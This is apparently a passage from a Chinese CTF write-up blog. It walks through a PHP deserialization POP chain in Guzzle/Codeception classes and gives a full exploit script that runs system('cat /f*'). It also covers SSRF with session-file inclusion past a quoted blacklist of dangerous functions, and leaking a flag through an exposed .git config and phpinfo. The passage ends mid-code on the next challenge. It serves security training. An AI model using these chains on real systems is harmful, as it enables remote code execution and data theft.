<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">GuzzleHttp</span>\<span class="title class_">Psr7</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">rewind</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewind</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$whence</span> = SEEK_SET</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;seekable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\RuntimeException</span>(<span class="string">&#x27;This AppendStream is not seekable&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$whence</span> !== SEEK_SET) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\RuntimeException</span>(<span class="string">&#x27;The AppendStream can only seek with SEEK_SET&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pos = <span class="variable language_">$this</span>-&gt;current = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Rewind each stream</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;streams <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$stream</span>-&gt;<span class="title function_ invoke__">rewind</span>();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\RuntimeException</span>(<span class="string">&#x27;Unable to seek stream &#x27;</span></span><br><span class="line">                    . <span class="variable">$i</span> . <span class="string">&#x27; of the AppendStream&#x27;</span>, <span class="number">0</span>, <span class="variable">$e</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进魔术方法<code>__tostring</code>，一路跟下去，可以看到<code>$stream-&gt;rewind();</code>，而属性<code>$stream</code>可控，检索到<code>CachingStream.php</code>里有这个方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">GuzzleHttp</span>\<span class="title class_">Psr7</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$skipReadBytes</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewind</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$byte</span> = <span class="variable">$offset</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">getSize</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span> &amp;&amp; !<span class="variable language_">$this</span>-&gt;remoteStream-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$diff</span>);</span><br><span class="line">                <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">getSize</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">seek</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="variable">$remoteData</span> = <span class="variable language_">$this</span>-&gt;remoteStream-&gt;<span class="title function_ invoke__">read</span>(</span><br><span class="line">                <span class="variable">$remaining</span> + <span class="variable language_">$this</span>-&gt;skipReadBytes</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;skipReadBytes) &#123;</span><br><span class="line">                <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$remoteData</span>);</span><br><span class="line">                <span class="variable">$remoteData</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$remoteData</span>, <span class="variable language_">$this</span>-&gt;skipReadBytes);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;skipReadBytes = <span class="title function_ invoke__">max</span>(<span class="number">0</span>, <span class="variable language_">$this</span>-&gt;skipReadBytes - <span class="variable">$len</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> .= <span class="variable">$remoteData</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$remoteData</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟下去，出现<code>$data = $this-&gt;stream-&gt;read($length);</code>，<code>$stream</code>同样可控，检索到<code>PumpStream.php</code>中有方法<code>read</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">GuzzleHttp</span>\<span class="title class_">Psr7</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tellPos</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$metadata</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;buffer-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$readLen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tellPos += <span class="variable">$readLen</span>;</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - <span class="variable">$readLen</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pump</span>(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="variable">$data</span> .= <span class="variable language_">$this</span>-&gt;buffer-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tellPos += <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) - <span class="variable">$readLen</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pump</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;source, <span class="variable">$length</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">false</span> || <span class="variable">$data</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;source = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;buffer-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$data</span>);</span><br><span class="line">                <span class="variable">$length</span> -= <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="variable">$length</span> &gt; <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进，最后看到一个回调函数<code>call_user_func($this-&gt;source, $length);</code>，<code>$source</code>可控，可以进行rce了</p>
<p>可以看到<code>index.php</code>里是将传入的数据进行了base64解码再进行反序列化的，所以要对得到的序列化字符串进行base64编码</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes[]=<span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>(<span class="keyword">new</span> <span class="title class_">AppendStream</span>());</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output=<span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">RunProcess</span>())));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">GuzzleHttp</span>\<span class="title class_">Psr7</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;streams[]=<span class="keyword">new</span> <span class="title class_">CachingStream</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;remoteStream=<span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>(<span class="literal">false</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;stream=<span class="keyword">new</span>  <span class="title class_">PumpStream</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>=-<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;buffer=<span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);&#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h2><p>（赛后复现）</p>
<p>进后台之后传一个url，进行ssrf但发现有过滤。</p>
<p>扫</p>
<p>得到有一个admin文件夹，ssrf:<br>POST:<code>urll=http://127.0.0.1/admin</code></p>
<p>显示还有一个<code>include123.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//累了累了，饮茶先</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;检测到恶意字符&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>检测很多，无法使用伪协议，使用session包含</p>
<p>向靶机上传文件，同时传session文件</p>
<p>文件名就是<code>sess_</code>加上<code>PHPSESSID</code>的值</p>
<p>接着查到根目录下的<code>getflag.sh</code>，执行即可</p>
<h1 id="第五空间"><a href="#第五空间" class="headerlink" title="第五空间"></a>第五空间</h1><h2 id="webftp"><a href="#webftp" class="headerlink" title="webftp"></a>webftp</h2><p><code>http://114.115.185.167:32770/.git/config</code><br>得到：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[core]</span></span><br><span class="line">	<span class="attr">repositoryformatversion</span> = <span class="number">0</span></span><br><span class="line">	<span class="attr">filemode</span> = <span class="literal">false</span></span><br><span class="line">	<span class="attr">bare</span> = <span class="literal">false</span></span><br><span class="line">	<span class="attr">logallrefupdates</span> = <span class="literal">true</span></span><br><span class="line">	<span class="attr">symlinks</span> = <span class="literal">false</span></span><br><span class="line">	<span class="attr">ignorecase</span> = <span class="literal">true</span></span><br><span class="line"><span class="section">[remote &quot;origin&quot;]</span></span><br><span class="line">	<span class="attr">url</span> = git://github.com/wifeat/WebFTP</span><br><span class="line">	<span class="attr">fetch</span> = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line"><span class="section">[branch &quot;master&quot;]</span></span><br><span class="line">	<span class="attr">remote</span> = origin</span><br><span class="line">	<span class="attr">merge</span> = refs/heads/maste</span><br></pre></td></tr></table></figure>
<p>打开：github.com&#x2F;wifeat&#x2F;WebFTP</p>
<p>下载，找：<br><code>Readme\mytz.php</code></p>
<p>探针文件里面有<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;act&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;act&#x27;</span>] == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接在<code>phpinfo</code>里<br>环境变量flag:</p>
<p><code>flag&#123;g28F28EPTjRoxM9sNBDtMS3ZPuIPXL6A&#125;</code></p>
<h2 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span 